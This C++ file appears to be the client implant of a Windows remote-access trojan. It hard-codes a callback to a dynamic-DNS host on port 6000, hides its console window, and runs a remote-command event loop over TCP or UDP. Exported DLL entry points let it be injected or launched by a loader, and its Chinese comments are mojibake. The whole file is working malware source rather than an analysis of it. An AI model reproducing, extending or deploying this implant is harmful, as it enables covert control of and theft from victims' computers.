// winosclient.cpp : �������̨Ӧ�ó������ڵ㡣
//
#include "stdafx.h"
#include "SpeakerManager.h"


struct plugInfo
{
	char mark[30];		//���
	TCHAR szAddress[255];  //ip
	DWORD szPort;	//�˿�
	BOOL IsTcp;
	BOOL RunDllEntryProc;
}MyInfo =
{
"plugmark",
_T("iamasbcx.asuscomm.com"),
6000,
1,
0,
};

HANDLE hThread = NULL;



DWORD WINAPI MainThread(LPVOID dllMainThread)
{
	ISocketBase* socketClient;
	if (MyInfo.IsTcp == 1)
		socketClient = new CTcpSocket();
	else
		socketClient = new CUdpSocket();

	if (socketClient->Connect(MyInfo.szAddress, MyInfo.szPort))
	{
		CSpeakerManager	manager(socketClient);
		socketClient->run_event_loop();
	}

	SAFE_DELETE(socketClient);
	if (MyInfo.RunDllEntryProc)
		ExitProcess(0);
	return 0;


}

#ifndef _WINDLL

#include "DbgHelp.h"
int GenerateMiniDump(PEXCEPTION_POINTERS pExceptionPointers)
{
	// ���庯��ָ��
	typedef BOOL(WINAPI* MiniDumpWriteDumpT)(
		HANDLE,
		DWORD,
		HANDLE,
		MINIDUMP_TYPE,
		PMINIDUMP_EXCEPTION_INFORMATION,
		PMINIDUMP_USER_STREAM_INFORMATION,
		PMINIDUMP_CALLBACK_INFORMATION
		);
	// �� "DbgHelp.dll" ���л�ȡ "MiniDumpWriteDump" ����
	MiniDumpWriteDumpT pfnMiniDumpWriteDump = NULL;
	HMODULE hDbgHelp = LoadLibrary((_T("DbgHelp.dll")));
	if (NULL == hDbgHelp)
	{
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	pfnMiniDumpWriteDump = (MiniDumpWriteDumpT)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");

	if (NULL == pfnMiniDumpWriteDump)
	{
		FreeLibrary(hDbgHelp);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	// ���� dmp �ļ���
	TCHAR szFileName[MAX_PATH] = { 0 };
	TCHAR* szVersion = _T("!analyze -v");
	SYSTEMTIME stLocalTime;
	GetLocalTime(&stLocalTime);
	wsprintf(szFileName, _T("%s-%04d%02d%02d-%02d%02d%02d.dmp"),
		szVersion, stLocalTime.wYear, stLocalTime.wMonth, stLocalTime.wDay,
		stLocalTime.wHour, stLocalTime.wMinute, stLocalTime.wSecond);
	HANDLE hDumpFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE | FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
	if (INVALID_HANDLE_VALUE == hDumpFile)
	{
		FreeLibrary(hDbgHelp);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	// д�� dmp �ļ�
	MINIDUMP_EXCEPTION_INFORMATION expParam;
	expParam.ThreadId = GetCurrentThreadId();
	expParam.ExceptionPointers = pExceptionPointers;
	expParam.ClientPointers = FALSE;
	pfnMiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(),
		hDumpFile, MiniDumpWithDataSegs, (pExceptionPointers ? &expParam : NULL), NULL, NULL);
	// �ͷ��ļ�
	CloseHandle(hDumpFile);
	FreeLibrary(hDbgHelp);
	return EXCEPTION_EXECUTE_HANDLER;
}


LONG WINAPI ExceptionFilter(LPEXCEPTION_POINTERS lpExceptionInfo)
{
	// ������һЩ�쳣�Ĺ��˻���ʾ
	if (IsDebuggerPresent())
	{
		return EXCEPTION_CONTINUE_SEARCH;
	}
	return GenerateMiniDump(lpExceptionInfo);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR szCmdLine, int iCmdShow)
{
	SetUnhandledExceptionFilter(ExceptionFilter);

	// ����������ʱ��С©��������ʧ
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	PostThreadMessageA(GetCurrentThreadId(), NULL, 0, 0);
	GetInputState();
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//�����߳�
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	Sleep(300);
	return 0;
}
#endif



BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		if (MyInfo.RunDllEntryProc && (hThread == NULL))
		{
			hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//�����߳�
			WaitForSingleObject(hThread, INFINITE);
		}
	}
	break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}



extern "C" __declspec(dllexport) bool Main(TCHAR * ip, DWORD port, BOOL IsTcp,  BOOL RunDllEntryProc)
{
	_tcscpy_s(MyInfo.szAddress, ip);
	MyInfo.szPort = port;
	MyInfo.IsTcp = IsTcp;
	MyInfo.RunDllEntryProc = RunDllEntryProc;
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//�����߳�
	WaitForSingleObject(hThread, INFINITE);
	Sleep(300);
	return 0;
}

extern "C" __declspec(dllexport) bool run()
{
	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//�����߳�
	WaitForSingleObject(hThread, INFINITE);
	Sleep(300);
	return 0;
}